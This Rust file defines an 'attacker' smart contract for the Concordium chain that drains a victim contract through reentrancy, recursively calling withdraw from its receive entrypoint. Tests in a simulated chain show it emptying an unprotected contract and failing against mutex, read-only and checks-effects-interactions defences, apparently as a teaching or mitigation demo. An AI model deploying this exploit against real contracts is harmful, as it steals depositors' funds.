#![cfg_attr(not(feature = "std"), no_std)]
use crate::common::{Error, Receiver, WithdrawParams};
use concordium_std::*;

#[derive(Debug, Deserial, Serial, SchemaType, PartialEq)]
pub enum AttackerEvent {
    Exploited(ContractAddress, Amount),
}

#[derive(Serialize, SchemaType)]
pub struct AttackerState {
    victim: ContractAddress,
    deposit: Amount,
}

impl AttackerState {
    fn new(victim: ContractAddress) -> Self {
        Self {
            victim,
            deposit: Amount::zero(),
        }
    }
}

#[init(
    contract = "attacker",
    event = "AttackerEvent",
    parameter = "ContractAddress",
    error = "Error"
)]
fn contract_attacker_init(
    ctx: &InitContext,
    _state_builder: &mut StateBuilder,
) -> InitResult<AttackerState> {
    let victim: ContractAddress = ctx.parameter_cursor().get()?;
    let state = AttackerState::new(victim);
    Ok(state)
}

#[receive(
    contract = "attacker",
    name = "deposit",
    parameter = "()",
    mutable,
    payable
)]
fn contract_attacker_deposit(
    ctx: &ReceiveContext,
    host: &mut Host<AttackerState>,
    amount: Amount,
) -> Result<(), Error> {
    ensure!(
        ctx.sender().matches_account(&ctx.owner()),
        Error::OwnerError
    );
    let victim = host.state().victim;

    host.invoke_contract_raw(
        &victim,
        Parameter::empty(),
        EntrypointName::new_unchecked("deposit"),
        amount,
    )?;
    host.state_mut().deposit += amount;
    Ok(())
}

#[receive(
    contract = "attacker",
    name = "attack",
    parameter = "()",
    error = "Error",
    enable_logger,
    mutable
)]
fn contract_attacker_attack(
    ctx: &ReceiveContext,
    host: &mut Host<AttackerState>,
    logger: &mut Logger,
) -> Result<(), Error> {
    ensure!(
        ctx.sender().matches_account(&ctx.owner()),
        Error::OwnerError
    );

    let victim = host.state().victim;

    let params = WithdrawParams {
        receiver: Receiver::Contract(
            ctx.self_address(),
            OwnedEntrypointName::new_unchecked("receive".to_string()),
        ),
    };

    host.invoke_contract(
        &victim,
        &params,
        EntrypointName::new_unchecked("withdraw"),
        Amount::zero(),
    )?;

    logger.log(&AttackerEvent::Exploited(victim, host.self_balance()))?;

    host.state_mut().deposit = Amount::zero();
    Ok(())
}

#[receive(
    contract = "attacker",
    name = "receive",
    parameter = "()",
    error = "Error",
    mutable,
    payable
)]
fn contract_attacker_receive(
    ctx: &ReceiveContext,
    host: &mut Host<AttackerState>,
    _amount: Amount,
) -> Result<(), Error> {
    ensure!(
        ctx.sender().matches_contract(&host.state().victim),
        Error::WrongVictimAddressErrror
    );
    let victim = host.state().victim;
    let victim_balance = host.contract_balance(victim)?;

    if victim_balance >= host.state().deposit {
        let params = WithdrawParams {
            receiver: Receiver::Contract(
                ctx.self_address(),
                OwnedEntrypointName::new_unchecked("receive".to_string()),
            ),
        };

        host.invoke_contract_raw(
            &victim,
            Parameter::new_unchecked(&to_bytes(&params)),
            EntrypointName::new_unchecked("withdraw"),
            Amount::zero(),
        )?;
    }
    Ok(())
}

#[receive(
    contract = "attacker",
    name = "transfer",
    parameter = "()",
    error = "Error",
    mutable
)]
fn contract_attacker_transfer(
    ctx: &ReceiveContext,
    host: &mut Host<AttackerState>,
) -> Result<(), Error> {
    ensure!(
        ctx.sender().matches_account(&ctx.owner()),
        Error::OwnerError
    );

    host.invoke_transfer(&&ctx.owner(), host.self_balance())?;

    Ok(())
}

#[cfg(test)]
mod test {
    use crate::common::{tests::*, Error};
    use anyhow::Result;
    use concordium_smart_contract_testing::*;

    #[test]
    fn test_attack_reentrance_mutex() -> Result<()> {
        validation_error(Victim::RentranceMutex, AttackError::Trapped)?;
        Ok(())
    }

    #[test]
    fn test_attack_reentrance_readonly() -> Result<()> {
        validation_error(Victim::ReentraceReadonly, AttackError::Trapped)?;
        Ok(())
    }

    #[test]
    fn test_attack_reentrance_reentrance_checks_effects_interactions() -> Result<()> {
        validation_error(
            Victim::ReentranceChecksEffectsInteractions,
            AttackError::Custom(Error::NothingDeposited),
        )?;
        Ok(())
    }

    fn validation_error(victim: Victim, expected_error: AttackError) -> Result<()> {
        // Arrange
        let (mut chain, contracts) = setup_with_victim(victim)?;
        let reentrance_contract = contracts.reentrance;
        let attacker = contracts.attacker;

        const TO_TRANSFER: Amount = Amount::from_ccd(42);
        // deposit from ACC other
        reentrace_deposit(
            REENTRANCE_READONLY,
            ACC_ADDR_OTHER,
            reentrance_contract.contract_address,
            TO_TRANSFER,
            &mut chain,
        )?;
        // deposit from ACC reentrace owner
        reentrace_deposit(
            REENTRANCE_READONLY,
            ACC_ADDR_OWNER,
            reentrance_contract.contract_address,
            TO_TRANSFER,
            &mut chain,
        )?;
        // deposit from ACC attacker
        reentrace_deposit(
            "attacker",
            ACC_ADDR_ATTACKER,
            attacker.contract_address,
            TO_TRANSFER,
            &mut chain,
        )?;

        // Act
        let attack_update = chain.contract_update(
            Signer::with_one_key(),
            ACC_ADDR_ATTACKER,
            Address::from(ACC_ADDR_ATTACKER),
            Energy::from(42_000),
            UpdateContractPayload {
                amount: Amount::zero(),
                address: attacker.contract_address,
                receive_name: OwnedReceiveName::new_unchecked("attacker.attack".to_string()),
                message: OwnedParameter::empty(),
            },
        );

        // Assert
        let error = get_error(attack_update.unwrap_err().trace_elements)?;
        assert_eq!(expected_error, error);
        Ok(())
    }

    #[derive(Debug, PartialEq)]
    enum AttackError {
        Custom(Error),
        Trapped,
        None,
    }

    fn get_error(elements: Vec<DebugTraceElement>) -> Result<AttackError> {
        for trace in elements {
            match trace {
                DebugTraceElement::WithFailures {
                    error,
                    trace_elements,
                    ..
                } => {
                    if trace_elements.is_empty() || is_all_regular(&trace_elements) {
                        let result = match error {
                            InvokeExecutionError::Reject { return_value, .. } => {
                                AttackError::Custom(from_bytes(&return_value)?)
                            }
                            InvokeExecutionError::Trap { .. } => AttackError::Trapped,
                        };
                        return Ok(result);
                    }
                    return get_error(trace_elements);
                }
                _ => (),
            }
        }
        Ok(AttackError::None)
    }

    fn is_all_regular(trace_elements: &Vec<DebugTraceElement>) -> bool {
        trace_elements.iter().all(|t| match t {
            DebugTraceElement::Regular { .. } => true,
            _ => false,
        })
    }

    #[test]
    fn test_attack_reentrance() -> Result<()> {
        // Arrange
        let victim = Victim::Reentrance;
        let (mut chain, contracts) = setup_with_victim(victim)?;
        let reentrance_contract = contracts.reentrance;
        let attacker = contracts.attacker;

        const TO_TRANSFER: Amount = Amount::from_ccd(42);
        let total_transfered: Amount = TO_TRANSFER * 3;
        // deposit from ACC other
        reentrace_deposit(
            REENTRANCE,
            ACC_ADDR_OTHER,
            reentrance_contract.contract_address,
            TO_TRANSFER,
            &mut chain,
        )?;
        // deposit from ACC reentrace owner
        reentrace_deposit(
            REENTRANCE,
            ACC_ADDR_OWNER,
            reentrance_contract.contract_address,
            TO_TRANSFER,
            &mut chain,
        )?;
        // deposit from ACC attacker
        reentrace_deposit(
            "attacker",
            ACC_ADDR_ATTACKER,
            attacker.contract_address,
            TO_TRANSFER,
            &mut chain,
        )?;
        let reentrance_contract_balance_before_attack = chain
            .contract_balance(reentrance_contract.contract_address)
            .unwrap();
        let view_before_attack = get_view(victim, &chain, &reentrance_contract)?;
        // now total of 42 * 3 = 126

        // Act
        chain
            .contract_update(
                Signer::with_one_key(),
                ACC_ADDR_ATTACKER,
                Address::from(ACC_ADDR_ATTACKER),
                Energy::from(42_000),
                UpdateContractPayload {
                    amount: Amount::zero(),
                    address: attacker.contract_address,
                    receive_name: OwnedReceiveName::new_unchecked("attacker.attack".to_string()),
                    message: OwnedParameter::empty(),
                },
            )
            .unwrap();

        let reentrance_contract_balance_after_attack = chain
            .contract_balance(reentrance_contract.contract_address)
            .unwrap();
        let attacker_contract_balance_after_attack =
            chain.contract_balance(attacker.contract_address).unwrap();

        // Assert
        assert_eq!(view_before_attack.len(), 3);

        assert_eq!(reentrance_contract_balance_before_attack, total_transfered);
        assert_eq!(attacker_contract_balance_after_attack, total_transfered);
        assert_eq!(reentrance_contract_balance_after_attack, Amount::zero());
        Ok(())
    }

    #[test]
    fn test_attacker_deposit_from_contract() -> Result<()> {
        // Arrange
        let victim = Victim::Reentrance;
        let (mut chain, contracts) = setup_with_victim(victim)?;
        let reentrance_contract = contracts.reentrance;
        let attacker = contracts.attacker;

        const TO_TRANSFER: Amount = Amount::from_ccd(42);

        // Act
        let _ = reentrace_deposit(
            "attacker",
            ACC_ADDR_ATTACKER,
            attacker.contract_address,
            TO_TRANSFER,
            &mut chain,
        )?;

        let view = get_view(victim, &chain, &reentrance_contract)?;

        // Assert
        let reentrance_balance_after = chain
            .contract_balance(reentrance_contract.contract_address)
            .unwrap();
        let attacker_balance_after = chain.contract_balance(attacker.contract_address).unwrap();
        assert_eq!(reentrance_balance_after, TO_TRANSFER);
        assert_eq!(attacker_balance_after, Amount::zero());

        assert_eq!(view.len(), 1);
        let state = view[0];
        assert_eq!(state.1, TO_TRANSFER);
        assert_eq!(state.0, Address::from(attacker.contract_address));
        Ok(())
    }

    #[test]
    fn test_attacker_receive_wrong_contract_address() -> Result<()> {
        // Arrange
        let (mut chain, contracts) = setup_with_victim(Victim::Reentrance)?;
        let attacker = contracts.attacker;

        // Act
        let update = chain.contract_update(
            Signer::with_one_key(),
            ACC_ADDR_OTHER,
            Address::from(attacker.contract_address), // fails since not victim address
            Energy::from(42_000),
            UpdateContractPayload {
                amount: Amount::zero(),
                address: attacker.contract_address,
                receive_name: OwnedReceiveName::new("attacker.receive".to_string())?,
                message: OwnedParameter::empty(),
            },
        );

        // Arrange
        let contract_error = update.expect_err("expected update to fail");
        let error: Error = from_bytes(&contract_error.return_value().unwrap())?;
        assert_eq!(error, Error::WrongVictimAddressErrror);
        Ok(())
    }
}
